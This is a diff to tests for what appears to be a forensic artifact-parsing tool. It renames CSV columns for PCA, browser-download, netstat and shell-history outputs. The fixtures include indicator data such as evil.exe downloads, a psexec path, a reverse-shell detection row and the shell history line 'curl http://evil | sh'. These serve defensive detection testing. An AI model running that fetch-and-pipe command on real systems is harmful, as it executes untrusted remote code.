@@ -947,7 +947,7 @@ def test_handler_pca(tmp_path):
     text = (out / "art_pca.csv").read_text(encoding="utf-8")
     # PCA writes the host's LOCAL time with no offset in the string, and it is a
     # verbatim passthrough -> the header must say `_local`, never bare or `_utc`
-    assert text.splitlines()[0] == "executable_path,last_executed_local"
+    assert text.splitlines()[0] == "path,last_executed_local"
     assert "evil.exe,2023-09-21 13:25:30.123" in text
     assert "\\\\SHARE\\tools\\psexec.exe" in text
 
@@ -973,13 +973,13 @@ def test_handler_pca_general(tmp_path, caplog):
         rows = list(_csv.DictReader(fh))
 
     assert rows[0] == {"run_time_local": "2026-01-05 10:00:00.123", "run_status": "2",
-                       "executable_path": "%USERPROFILE%\\Downloads\\tunnelx.exe",
+                       "path": "%USERPROFILE%\\Downloads\\tunnelx.exe",
                        "description": "TunnelX", "vendor": "Example Ltd", "version": "2.1",
                        "program_id": "0006abcd",
                        "exit_code": "Abnormal process exit with code 0x80", "extra": "",
-                       "file": "PcaGeneralDb0.txt"}
-    assert (rows[1]["executable_path"], rows[1]["extra"]) == ("", "not|a|record")
-    assert rows[2]["file"] == "PcaGeneralDb1.txt"
+                       "source_file": "PcaGeneralDb0.txt"}
+    assert (rows[1]["path"], rows[1]["extra"]) == ("", "not|a|record")
+    assert rows[2]["source_file"] == "PcaGeneralDb1.txt"
     assert "1 line(s) without the 8 expected fields" in caplog.text
 
     from artifact_engine.handlers import _execution as X
@@ -1155,7 +1155,7 @@ def test_handler_browser_chromium(tmp_path):
     assert "alice,Chrome,Default,http://evil.test,Evil Site,3,2024-01-17 21:20:00" in hist
     dl = (out / "art_browser_downloads.csv").read_text(encoding="utf-8")
     assert dl.splitlines()[0] == \
-        "user,browser,profile,target_path,source_url,bytes,start_utc,end_utc"
+        "user,browser,profile,path,source_url,bytes,start_utc,end_utc"
     assert "evil.exe" in dl and "http://evil.test/evil.exe" in dl
     assert "2024-01-17 21:20:00,2024-01-17 21:20:00" in dl    # UTC, not UTC+2
 
@@ -1326,11 +1326,11 @@ def test_handler_process_network_netstat_without_ss_and_ps_lstart(tmp_path):
         rows = list(csv.DictReader(fh))
     by = {(r["pid"], r["proto"]): r for r in rows}
     db = by[("1557", "tcp")]
-    assert (db["user"], db["start_local"], db["cmdline"], db["state"], db["local_port"],
+    assert (db["user"], db["start_local"], db["command_line"], db["state"], db["local_port"],
             db["source"]) == ("mysql", "Fri May 22 15:21:00 2026",
                               "/usr/sbin/mariadbd --basedir=/usr", "LISTEN", "3306", "uac/netstat")
     assert by[("", "udp")]["local_port"] == "68"            # a socket with no owner is kept
-    assert by[("1", "")]["cmdline"] == "/sbin/init"          # init holds no socket: its own row
+    assert by[("1", "")]["command_line"] == "/sbin/init"          # init holds no socket: its own row
     assert "PID" not in {r["pid"] for r in rows}             # the ps header is skipped
 
 
@@ -1609,7 +1609,7 @@ def test_handler_gtfobins_history_abuse(tmp_path):
     # reverse shell is the most severe -> sorts first
     assert rows[0]["function"] == "reverse-shell"
     # benign commands (incl. a real find) never appear
-    cmds = {r["command"] for r in rows}
+    cmds = {r["command_line"] for r in rows}
     assert "ls -la" not in cmds
     assert "sudo apt-get update" not in cmds
     assert "find /var/log -name '*.log'" not in cmds
@@ -5668,7 +5668,7 @@ def test_fish_history_is_read_with_its_times(tmp_path):
     lin_bash.run(_ctx(tmp_path, out))
     import csv
     with open(out / "art_shell_history.csv", encoding="utf-8", newline="") as fh:
-        rows = [(r["user"], r["shell"], r["timestamp_utc"], r["command"]) for r in csv.DictReader(fh)]
+        rows = [(r["user"], r["shell"], r["timestamp_utc"], r["command_line"]) for r in csv.DictReader(fh)]
     assert rows == [("bob", "fish", "2023-11-14 22:13:20", "curl http://evil | sh"),
                     ("bob", "fish", "", "echo a\nb \\ c"),
                     ("bob", "fish", "2023-11-14 22:14:20", "whoami")]
